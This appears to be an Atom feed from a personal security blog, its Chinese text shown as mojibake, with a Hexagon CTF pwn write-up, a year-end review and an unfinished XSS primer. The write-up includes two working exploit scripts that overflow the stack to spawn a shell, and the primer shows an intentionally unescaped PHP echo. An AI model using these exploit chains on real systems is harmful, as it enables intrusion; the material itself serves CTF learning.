<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>S1nec-1o&#39;s B1og</title>
  
  
  <link href="http://s1nec-1o.github.io/atom.xml" rel="self"/>
  
  <link href="http://s1nec-1o.github.io/"/>
  <updated>2025-02-13T07:39:36.898Z</updated>
  <id>http://s1nec-1o.github.io/</id>
  
  <author>
    <name>s1nec-1o</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hexagonå­¦ä¹ </title>
    <link href="http://s1nec-1o.github.io/2025/02/13/Hexagon%E5%AD%A6%E4%B9%A0/"/>
    <id>http://s1nec-1o.github.io/2025/02/13/Hexagon%E5%AD%A6%E4%B9%A0/</id>
    <published>2025-02-13T07:36:57.000Z</published>
    <updated>2025-02-13T07:39:36.898Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hexagon-å­¦ä¹ "><a href="#Hexagon-å­¦ä¹ " class="headerlink" title="Hexagon å­¦ä¹ "></a>Hexagon å­¦ä¹ </h1><p><strong>Hexagon</strong> æ˜¯é«˜é€šï¼ˆQualcommï¼‰å¼€å‘çš„ <strong>æ•°å­—ä¿¡å·å¤„ç†å™¨ï¼ˆDSPï¼‰</strong> æ¶æ„ï¼Œä¸“ä¸ºç§»åŠ¨è®¾å¤‡ã€ç‰©è”ç½‘å’Œè¾¹ç¼˜è®¡ç®—è®¾è®¡ï¼Œä»¥é«˜æ•ˆèƒ½ã€ä½åŠŸè€—ä¸ºæ ¸å¿ƒä¼˜åŠ¿ã€‚å®ƒè¢«é›†æˆåœ¨é«˜é€šéªé¾™ï¼ˆSnapdragonï¼‰ç³»åˆ—èŠ¯ç‰‡ä¸­</p><ul><li>hexagonç”¨<strong>allocframe</strong>å¼€è¾Ÿæ ˆå¸§ï¼šLRå‹æ ˆï¼ŒFPå‹æ ˆï¼ŒSPå‡å»ä¸€å®šæ•°å€¼å‘ä½åœ°å€å¼€è¾Ÿï¼ŒFPè®¾ç½®æˆæŒ‡å‘æ—§FPçš„æŒ‡é’ˆã€‚deallocframe&#x2F;dealloc_returnç”¨äºé”€æ¯æ ˆå¸§&#x2F;é”€æ¯æ ˆå¸§å¹¶è¿”å›ï¼Œä»æ ˆåº•å–å›FPå’ŒLRã€‚</li></ul><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202502131539009.png" alt="image-20250208213002824" style="zoom: 33%;" /><ul><li>ä¸€å…±æœ‰32ä¸ª32ä½é€šç”¨å¯„å­˜å™¨ï¼Œr0-r31ã€‚å­˜åœ¨å¯„å­˜å™¨å¯¹ï¼Œå¯ä»¥å½“åš64ä½å¯„å­˜å™¨ä½¿ç”¨ï¼Œå¦‚r0å’Œr1å¯ä»¥åˆå¹¶æˆr1:0</li><li>r29-r31æ˜¯åˆ«åå¯„å­˜å™¨ã€‚r29æ˜¯SPï¼Œr30æ˜¯FPï¼Œr31æ˜¯LRå¯„å­˜å™¨ã€‚SPæ˜¯æ ˆé¡¶å¯„å­˜å™¨ï¼ŒFPæ˜¯æ ˆï¼ˆåº•ï¼‰å¯„å­˜å™¨ï¼ŒLRæ˜¯å‚¨å­˜è¿”å›åœ°å€çš„å¯„å­˜å™¨ã€‚</li></ul><p>çœ‹æ±‡ç¼–æ„Ÿè§‰æ˜¯ç±»armæ¶æ„</p><p>ä¸»è¦çš„æ±‡ç¼–æœ‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">allocframe(#0x10) #å¼€è¾Ÿæ ˆç©ºé—´</span><br><span class="line">add(r0,#-0x10) #åŠ å‡ä¹˜é™¤ï¼Œæœ‰è¿”å›å€¼</span><br><span class="line">call func</span><br><span class="line">dealloc_return #pop and ret (ç±»ä¼¼popï¼Œä½†æ˜¯hexagonæ˜¯ä¹ˆæœ‰popæ»´)</span><br><span class="line">memw(r1) #å–æŒ‡é’ˆæŒ‡å‘çš„å†…å®¹</span><br></pre></td></tr></table></figure><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><h3 id="ã€2025VNCTFã€hexagon"><a href="#ã€2025VNCTFã€hexagon" class="headerlink" title="ã€2025VNCTFã€hexagon"></a>ã€2025VNCTFã€hexagon</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00020460</span>                 .global vuln</span><br><span class="line">.text:<span class="number">00020460</span> vuln:                                   <span class="comment">// CODE XREF: main+90â†“p</span></span><br><span class="line">.text:<span class="number">00020460</span>                 &#123; <span class="built_in">allocframe</span>(#<span class="number">0x10</span>) &#125;</span><br><span class="line">.text:<span class="number">00020464</span>                 &#123; r0 = <span class="built_in">add</span>(pc, ##aD@pcrel) &#125; <span class="comment">// &quot;%d&quot;</span></span><br><span class="line">.text:<span class="number">0002046</span>C                 &#123; r1 = <span class="built_in">add</span>(fp, #<span class="number">-0x10</span>) &#125;</span><br><span class="line">.text:<span class="number">00020470</span>                 &#123; call scanf &#125;</span><br><span class="line">.text:<span class="number">00020474</span>                 &#123; r0 = #<span class="number">0</span> &#125;             <span class="comment">// fd</span></span><br><span class="line">.text:<span class="number">00020478</span>                 &#123; r1 = <span class="built_in">add</span>(fp, #<span class="number">-8</span>) &#125;   <span class="comment">// buf</span></span><br><span class="line">.text:<span class="number">0002047</span>C                 &#123; r2 = #<span class="number">0x10</span> &#125;          <span class="comment">// nbytes</span></span><br><span class="line">.text:<span class="number">00020480</span>                 &#123; call read &#125;</span><br><span class="line">.text:<span class="number">00020484</span>                 &#123; r0 = <span class="built_in">add</span>(pc, ##aCatHomeCtfLog@pcrel) &#125; <span class="comment">// &quot;cat /home/ctf/log&quot;</span></span><br><span class="line">.text:<span class="number">0002048</span>C                 &#123; call system &#125;</span><br><span class="line">.text:<span class="number">00020490</span>                 &#123; nop</span><br><span class="line">.text:<span class="number">00020494</span>                   nop</span><br><span class="line">.text:<span class="number">00020498</span>                   nop</span><br><span class="line">.text:<span class="number">0002049</span>C                   dealloc_return &#125;</span><br><span class="line">.text:<span class="number">0002049</span>C <span class="comment">// End of function vuln</span></span><br></pre></td></tr></table></figure><p>å‘ç°allocframeåªå¼€è¾Ÿäº†0x10ä¸ªå­—èŠ‚çš„æ ˆç©ºé—´ï¼Œç„¶åreadçš„èµ·å§‹åœ°å€æ˜¯ä»fp-8å¼€å§‹çš„ï¼Œå†ç»“åˆ32ä½çš„4å­—èŠ‚åœ°å€ï¼Œæ˜¾ç„¶æœ‰æ ˆæº¢å‡º8ä¸ªå­—èŠ‚ï¼Œæº¢å‡ºåˆ°FPå’ŒLRçš„å­˜å‚¨ç©ºé—´ï¼Œè€ŒLRæ˜¯å­˜å–è¿”å›åœ°å€çš„ï¼Œä¾¿æœ‰åŠ«æŒè¿”å›åœ°å€ã€‚</p><h4 id="è§£æ³•1-systemæ‰§è¡Œ"><a href="#è§£æ³•1-systemæ‰§è¡Œ" class="headerlink" title="è§£æ³•1-systemæ‰§è¡Œ"></a>è§£æ³•1-systemæ‰§è¡Œ</h4><p>çœ‹äº†å®˜æ–¹wpä¹‹å</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202502131539011.png" alt="image-20250210142817772"></p><p>ä»libc.soä¸­æ‰¾åˆ°systemï¼Œå‘ç°ååº•å±‚çš„systemå®ç°æ–¹å¼æ˜¯é€šè¿‡posix_spawnè¿›ç¨‹åˆ›å»ºå‡½æ•°ï¼ˆç†è§£ä¸ºfork+execveå³å¯ï¼‰ï¼Œé€šè¿‡å¯¹å‚æ•°çš„ç®€å•åˆ†æï¼Œå¯ä»¥çŸ¥é“r1&#x3D;â€&#x2F;bin&#x2F;shâ€ï¼Œç„¶åargv[] &#x3D; {â€œshâ€, â€œ-câ€, user_input, NULL};ï¼Œè€Œè¿™ä¸ªusr_inputæ˜¯é€šè¿‡fp-0x10è¾“å…¥çš„ï¼Œè¯¦æƒ…è‡ªè¡ŒæŸ¥çœ‹posix_spawnçš„å‚æ•°</p><p>ç„¶åå›åˆ°é¢˜ç›®å‘ç°ä¸€å¼€å§‹æœ‰ä¸€ä¸ªscanfå‡½æ•°æ˜¯è¾“å…¥fp-0x10çš„ï¼Œé‚£ä¹ˆå±€åŠ¿å°±å¾ˆæ˜æœ—äº†ï¼ŒåŒæ—¶ç”±äºqemuçš„libcæ˜¯ä¸ä¼šæ”¹å˜çš„ï¼Œå› æ­¤ä¼ å…¥ä¸€ä¸ª&#x2F;bin&#x2F;shçš„åœ°å€å°±è¡Œå•¦</p><p>libcåœ°å€çš„å¯»æ‰¾ï¼š</p><p>è¿™é‡Œæ˜¯é€šè¿‡æ—¥å¿—æ¥å¯»æ‰¾çš„</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set_tid_address</span>(<span class="number">1073672412</span>,<span class="number">1073672412</span>,<span class="number">-4</span>,<span class="number">0</span>,<span class="number">1072439316</span>,<span class="number">67108864</span>) = <span class="number">7</span></span><br></pre></td></tr></table></figure><p>è€Œè¿™ä¸ª1073672412æ˜¯æŒ‡é’ˆåœ°å€ï¼Œé€šå¸¸ç”±libcåˆ†é…çš„å­˜å‚¨tidï¼ˆçº¿ç¨‹idï¼‰çš„ï¼Œä»libcä¸­å¯»æ‰¾åˆ°å¯¹åº”çš„ç»“æ„ä½“</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">0012F</span>0DC __thread_list_lock:.space <span class="number">1</span>             <span class="comment">// DATA XREF: __init_tp+70â†‘o</span></span><br><span class="line">.bss:<span class="number">0012F</span>0DC                                         <span class="comment">// __post_Fork+28â†‘o ...</span></span><br><span class="line">.bss:<span class="number">0012F</span>0DD                 .space <span class="number">1</span></span><br><span class="line">.bss:<span class="number">0012F</span>0DE                 .space <span class="number">1</span></span><br><span class="line">.bss:<span class="number">0012F</span>0DF                 .space <span class="number">1</span></span><br></pre></td></tr></table></figure><p>ç›¸å‡è·å¾—libc_base&#x3D;0x3FEC0000ï¼ˆç®—æ˜¯å–å·§å§ï¼Œå› ä¸ºæˆ‘çš„qemuå•æ­¥æ‰§è¡Œåæ‰å•¦&#x2F;(ã„’oã„’)&#x2F;~~ï¼‰</p><p>æœ¬åœ°ç¯å¢ƒä¸è¿œç¨‹æœ‰å·®è·ï¼Œä¸è¿‡æ–¹æ³•ç±»ä¼¼</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="built_in">process</span>([<span class="string">&#x27;qemu-hexagon&#x27;</span> , <span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;in_asm,exec,cpu,nochain&#x27;</span>, <span class="string">&#x27;-strace&#x27;</span>, <span class="string">&#x27;-dfilter&#x27;</span>, <span class="string">&#x27;0x20420+0xc0&#x27;</span>, <span class="string">&#x27;-D&#x27;</span>, <span class="string">&#x27;./log&#x27;</span>, <span class="string">&#x27;./main&#x27;</span>])</span><br><span class="line">libc_base=<span class="number">0x40810000</span></span><br><span class="line">fp=<span class="number">0x4080f078</span></span><br><span class="line">binsh = libc_base+<span class="number">0x119f7</span></span><br><span class="line"><span class="built_in">ru</span>(b<span class="number">&#x27;</span>\n<span class="number">&#x27;</span>)</span><br><span class="line"><span class="built_in">sl</span>(<span class="built_in">tbs</span>(binsh))</span><br><span class="line">payload = <span class="built_in">p32</span>(<span class="number">0</span>)*<span class="number">2</span>+<span class="built_in">p32</span>(fp+<span class="number">8</span>)+<span class="built_in">p32</span>(libc_base+<span class="number">0xBE7C0</span>)</span><br><span class="line"><span class="built_in">s</span>(payload)</span><br><span class="line"><span class="built_in">irt</span>()</span><br></pre></td></tr></table></figure><h4 id="è§£æ³•2-æ ˆè¿ç§»"><a href="#è§£æ³•2-æ ˆè¿ç§»" class="headerlink" title="è§£æ³•2-æ ˆè¿ç§»"></a>è§£æ³•2-æ ˆè¿ç§»</h4><p>å¯¹1è¡€è„šæœ¬å­¦ä¹ ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">stack_addr = <span class="number">0x4080f1c8</span></span><br><span class="line">libc_base= <span class="number">0x3FEC0000</span></span><br><span class="line">gadget1 = <span class="number">0x20534</span> <span class="comment"># r0 = memw(fp + #var_8) dealloc_return</span></span><br><span class="line">gadget2 = libc_base + <span class="number">0xDB2CC</span> <span class="comment"># r0 = memw(fp + #var_4) dealloc_return</span></span><br><span class="line">gadget3 = libc_base + <span class="number">0x54630</span> <span class="comment"># r0 = memw(fp -0x10 ) dealloc_return</span></span><br><span class="line">ret = <span class="number">0x20538</span></span><br><span class="line">bss = <span class="number">0x406d0</span></span><br><span class="line">bss = stack_addr</span><br><span class="line">target = <span class="number">0x1039E</span></span><br><span class="line">call_system = <span class="number">0x2048C</span></span><br><span class="line"></span><br><span class="line">payload = <span class="built_in">str</span>(<span class="number">0x1000</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Welcome back, hexagon player!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p32(bss+<span class="number">8</span>) + p32(<span class="number">0x20474</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p32(bss-<span class="number">0x30</span>+<span class="number">8</span>) + p32(<span class="number">0x20474</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p32(bss-<span class="number">0x20</span>+<span class="number">0x8</span>) + p32(<span class="number">0x20474</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x4080f198</span>) + <span class="string">b&#x27;bbbb&#x27;</span> + p32(bss-<span class="number">0x10</span>+<span class="number">0x8</span>) + p32(<span class="number">0x20474</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;sh\x00\x00&#x27;</span> + p32(<span class="number">0x2048C</span>) + p32(bss-<span class="number">0x10</span>) + p32(gadget3)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># bss-0x30 /bin/sh          </span></span><br><span class="line"><span class="comment"># bss-0x2c xxxx</span></span><br><span class="line"><span class="comment"># bss-0x28 bss-0x20+8</span></span><br><span class="line"><span class="comment"># bss-0x24 start_read</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bss-0x20 0x4080f198       </span></span><br><span class="line"><span class="comment"># bss-0x1c bbbb</span></span><br><span class="line"><span class="comment"># bss-0x18 bss-0x10+8</span></span><br><span class="line"><span class="comment"># bss-0x14 start_read</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bss-0x10 sh          </span></span><br><span class="line"><span class="comment"># bss-0xc  0xdeadbeaf</span></span><br><span class="line"><span class="comment"># bss-8    bss-0x10</span></span><br><span class="line"><span class="comment"># bss-4    gadget3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bss      aaaa              </span></span><br><span class="line"><span class="comment"># bss+4    aaaa</span></span><br><span class="line"><span class="comment"># bss+8    bss-0x30+8</span></span><br><span class="line"><span class="comment"># bss+0xc  start_read</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>æœ‰æ„æ€çš„</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Hexagon-å­¦ä¹ &quot;&gt;&lt;a href=&quot;#Hexagon-å­¦ä¹ &quot; class=&quot;headerlink&quot; title=&quot;Hexagon å­¦ä¹ &quot;&gt;&lt;/a&gt;Hexagon å­¦ä¹ &lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Hexagon&lt;/strong&gt; æ˜¯é«˜é€šï¼ˆQualcommï¼‰</summary>
      
    
    
    
    <category term="hexagon-pwn" scheme="http://s1nec-1o.github.io/categories/hexagon-pwn/"/>
    
    
    <category term="hexagon" scheme="http://s1nec-1o.github.io/tags/hexagon/"/>
    
  </entry>
  
  <entry>
    <title>2024å¹´ç»ˆæ€»ç»“</title>
    <link href="http://s1nec-1o.github.io/2025/02/01/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <id>http://s1nec-1o.github.io/2025/02/01/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</id>
    <published>2025-02-01T08:50:35.000Z</published>
    <updated>2025-02-01T09:01:57.328Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024å¹´ç»ˆæ€»ç»“"><a href="#2024å¹´ç»ˆæ€»ç»“" class="headerlink" title="2024å¹´ç»ˆæ€»ç»“"></a>2024å¹´ç»ˆæ€»ç»“</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç¬¬ä¸€æ¬¡å†™å¹´ç»ˆæ€»ç»“å‘¢ï¼Œä¸€å¹´è¿‡çš„å¥½å¿«ï¼Œå¤§ä¸€å°ç™»-&gt;å¤§äºŒè€ç™»ï¼Œæ„Ÿè§‰ä¸‹åŠå¹´æœ‰ç‚¹æ‘†çƒ‚ï¼ˆï¼Œä¸»è¦è¿˜æ˜¯å¯¹IoTé¢†åŸŸçš„ä¸äº†è§£ï¼Œä»¥åŠè‡ªèº«èƒ½åŠ›çš„ç¼ºé™·ï¼Œå¸Œæœ›æ˜å¹´èƒ½åŠ ä»¥æ”¹è¿›ï¼Œåœ¨æ­¤å†™ä¸‹2024å¹´çš„æ”¶è·ä¸å¯¹2025çš„å¸Œå†€</p><h2 id="æ”¶è·"><a href="#æ”¶è·" class="headerlink" title="æ”¶è·"></a>æ”¶è·</h2><ol><li>è·å¾—äº†ç¬¬ä¸€æšCVEï¼Œä»0åˆ°1çš„çªç ´ï¼ï¼</li><li>è·å¾—äº†ciscnåä¸œå—åˆ†åŒºçš„äºŒç­‰å¥–</li><li>ç»“è¯†äº†è®¸å¤šä¼™ä¼´</li></ol><p>èƒ½è¯´çš„ä¸Šå·çš„ä¹Ÿå°±è¿™å‡ ä¸ªğŸ¥²ï¼Œä½†æœ€çè´µçš„è¿˜æ˜¯å¿ƒæ€ä¸Šçš„è½¬å˜ä»¥åŠå¯¹è‡ªæˆ‘çš„æ¸…æ™°è®¤çŸ¥</p><h2 id="ç›®æ ‡"><a href="#ç›®æ ‡" class="headerlink" title="ç›®æ ‡"></a>ç›®æ ‡</h2><ol><li>è·å–å¤§å‚ç±»ä¼¼æ€ç§‘ï¼Œåä¸ºï¼Œåç¡•ç­‰çš„å„ä¸€æšCVE</li><li>è¡¥è¶³Webå®‰å…¨çš„çŸ¥è¯†</li><li>è·å¾—å‡ ä¸ªæ¯”èµ›çš„å¥–é¡¹ï¼ˆPwnï¼ï¼ï¼ï¼‰</li><li>ç¡¬ä»¶å®‰å…¨</li><li>æ— çº¿ç”µå®‰å…¨</li><li>æœ€åï¼Œå¸Œæœ›èƒ½æŒ–åˆ°ä¸€æšæœªæˆæƒRCE</li></ol><p>å¸Œæœ› 2025çš„æˆ‘ ä¸‡äº‹èƒœæ„ï¼å¤©å¤©å¼€å¿ƒï¼åŠªåŠ›å­¦ä¹ ï¼å¤©å¤©å‘ä¸Šï¼å“¦è€¶</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024å¹´ç»ˆæ€»ç»“&quot;&gt;&lt;a href=&quot;#2024å¹´ç»ˆæ€»ç»“&quot; class=&quot;headerlink&quot; title=&quot;2024å¹´ç»ˆæ€»ç»“&quot;&gt;&lt;/a&gt;2024å¹´ç»ˆæ€»ç»“&lt;/h1&gt;&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="2024å¹´ç»ˆæ€»ç»“" scheme="http://s1nec-1o.github.io/categories/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="å¹´ç»ˆæ€»ç»“" scheme="http://s1nec-1o.github.io/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>åˆæ¢XSS</title>
    <link href="http://s1nec-1o.github.io/2025/01/23/%E5%88%9D%E6%8E%A2XSS/"/>
    <id>http://s1nec-1o.github.io/2025/01/23/%E5%88%9D%E6%8E%A2XSS/</id>
    <published>2025-01-23T06:06:48.000Z</published>
    <updated>2025-01-23T06:17:01.427Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSSå­¦ä¹ "><a href="#XSSå­¦ä¹ " class="headerlink" title="XSSå­¦ä¹ "></a>XSSå­¦ä¹ </h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨IoTè®¾å¤‡ä¸­ï¼Œä¹Ÿæœ‰é‡åˆ°è¿‡XSSçš„æƒ…å†µï¼Œåœ¨æ­¤å­¦ä¹ ing</p><h2 id="XSSç®€ä»‹"><a href="#XSSç®€ä»‹" class="headerlink" title="XSSç®€ä»‹"></a>XSSç®€ä»‹</h2><p>xssæ¼æ´é€šå¸¸æ˜¯é€šè¿‡phpçš„è¾“å‡ºå‡½æ•°å°†javascriptä»£ç è¾“å‡ºåˆ°htmlé¡µé¢ä¸­ï¼Œé€šè¿‡ç”¨æˆ·æœ¬åœ°æµè§ˆå™¨æ‰§è¡Œçš„ï¼Œæ‰€ä»¥xssæ¼æ´å…³é”®å°±æ˜¯<strong>å¯»æ‰¾å‚æ•°æœªè¿‡æ»¤çš„è¾“å‡ºå‡½æ•°</strong>ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xss</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xss</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="äº§ç”Ÿå±‚é¢"><a href="#äº§ç”Ÿå±‚é¢" class="headerlink" title="äº§ç”Ÿå±‚é¢"></a>äº§ç”Ÿå±‚é¢</h2><p>äº§ç”Ÿå±‚é¢ä¸€èˆ¬éƒ½æ˜¯åœ¨å‰ç«¯ï¼ŒJavaScriptä»£ç èƒ½å¹²ä»€ä¹ˆï¼Œæ‰§è¡Œä¹‹åå°±ä¼šè¾¾åˆ°ç›¸åº”çš„æ•ˆæœ</p><h2 id="å‡½æ•°ç±»"><a href="#å‡½æ•°ç±»" class="headerlink" title="å‡½æ•°ç±»"></a>å‡½æ•°ç±»</h2><p>æ¯”å¦‚è¯´phpä¸­çš„è„šæœ¬çš„è¾“å‡ºå‡½æ•°</p><p>å¸¸è§çš„è¾“å‡ºå‡½æ•°æœ‰ï¼š<code>print</code>ã€<code>print_r</code>ã€<code>echo</code>ã€<code>printf</code>ã€<code>sprintf</code>ã€<code>die</code>ã€<code>var_dump</code>ã€<code>var_export</code></p><p>å…¶å®<strong>å½’æ ¹ç»“åº•</strong>ï¼ŒXSSçš„æ”»å‡»æ–¹å¼å°±æ˜¯æƒ³åŠæ³•â€œæ•™å”†â€ç”¨æˆ·çš„æµè§ˆå™¨å»æ‰§è¡Œä¸€äº›è¿™ä¸ªç½‘é¡µä¸­åŸæœ¬ä¸å­˜åœ¨çš„<strong>å‰ç«¯ä»£ç </strong>ã€‚</p><h2 id="ä»€ä¹ˆå¯¼è‡´xss"><a href="#ä»€ä¹ˆå¯¼è‡´xss" class="headerlink" title="ä»€ä¹ˆå¯¼è‡´xss"></a>ä»€ä¹ˆå¯¼è‡´xss</h2><p><strong>è¾“å…¥éªŒè¯å’Œæ¸…ç†ä¸è¶³</strong></p><p>Web åº”ç”¨ç¨‹åºæ¥å—ç”¨æˆ·æ•°æ®ï¼ˆä¾‹å¦‚é€šè¿‡è¡¨å•ï¼‰ï¼Œå¹¶ä½¿ç”¨è¿™äº›æ•°æ®åŠ¨æ€ç”Ÿæˆ HTML é¡µé¢ã€‚å› æ­¤ï¼Œæ¶æ„è„šæœ¬å¯ä»¥ä½œä¸ºåˆæ³•è¾“å…¥çš„ä¸€éƒ¨åˆ†åµŒå…¥ï¼Œå¹¶æœ€ç»ˆç”±æµè§ˆå™¨æ‰§è¡Œï¼Œé™¤éç»è¿‡å……åˆ†æ¸…ç†ã€‚</p><p><strong>ç¼ºä¹è¾“å‡ºç¼–ç </strong></p><p>ç”¨æˆ·å¯ä»¥ä½¿ç”¨å„ç§å­—ç¬¦æ¥æ”¹å˜ Web æµè§ˆå™¨å¤„ç†å’Œæ˜¾ç¤ºç½‘é¡µçš„æ–¹å¼ã€‚å¯¹äº HTML éƒ¨åˆ†ï¼Œå°†<code>&lt;</code>ã€<code>&gt;</code>ã€<code>&quot;</code>ã€<code>&#39;</code>å’Œ<code>&amp;</code>ç­‰å­—ç¬¦æ­£ç¡®ç¼–ç ä¸ºå„è‡ªçš„ HTML ç¼–ç è‡³å…³é‡è¦ã€‚å¯¹äº JavaScriptï¼Œåº”ç‰¹åˆ«æ³¨æ„è½¬ä¹‰<code>&#39;</code>ã€<code>&quot;</code>å’Œ<code>\</code>ã€‚<strong>æ— æ³•æ­£ç¡®ç¼–ç ç”¨æˆ·æä¾›çš„æ•°æ®</strong>æ˜¯å¯¼è‡´XSSæ¼æ´çš„ä¸»è¦åŸå› ã€‚</p><p><strong>å®‰å…¨æ ‡å¤´ä½¿ç”¨ä¸å½“</strong></p><p>å„ç§å®‰å…¨æ ‡å¤´éƒ½å¯ä»¥å¸®åŠ©ç¼“è§£XSSæ¼æ´ã€‚ä¾‹å¦‚ï¼Œå†…å®¹å®‰å…¨ç­–ç•¥ ( CSP )é€šè¿‡å®šä¹‰å“ªäº›æ¥æºå¯ä¿¡ä»»å¯æ‰§è¡Œè„šæœ¬æ¥ç¼“è§£XSSé£é™©ã€‚é…ç½®é”™è¯¯çš„CSPï¼ˆä¾‹å¦‚è¿‡äºå®½æ¾çš„ç­–ç•¥æˆ–ä¸å½“ä½¿ç”¨<code>unsafe-inline</code>æˆ–<code>unsafe-eval</code>æŒ‡ä»¤ï¼‰å¯èƒ½ä¼šè®©æ”»å‡»è€…æ›´å®¹æ˜“æ‰§è¡Œå…¶XSSè´Ÿè½½ã€‚</p><p><strong>æ¡†æ¶å’Œè¯­è¨€æ¼æ´</strong></p><p>ä¸€äº›è¾ƒ<strong>æ—§çš„ Web æ¡†æ¶</strong>æœªæä¾›é’ˆå¯¹XSSçš„å®‰å…¨æœºåˆ¶ï¼›å…¶ä»–ä¸€äº›æ¡†æ¶å­˜åœ¨æœªä¿®è¡¥çš„XSSæ¼æ´ã€‚ç°ä»£ Web æ¡†æ¶åœ¨è®¾è®¡ä¸Šä¼šè‡ªåŠ¨é¿å¼€XSSï¼Œå¹¶åŠæ—¶ä¿®è¡¥ä»»ä½•å‘ç°çš„æ¼æ´ã€‚</p><p><strong>ç¬¬ä¸‰æ–¹åº“</strong></p><p>åœ¨ Web åº”ç”¨ç¨‹åºä¸­é›†æˆç¬¬ä¸‰æ–¹åº“å¯èƒ½ä¼šå¼•å…¥XSSæ¼æ´ï¼›å³ä½¿æ ¸å¿ƒ Web åº”ç”¨ç¨‹åºä¸æ˜“å—åˆ°æ”»å‡»ã€‚</p><h2 id="Bug-code"><a href="#Bug-code" class="headerlink" title="Bug code"></a>Bug 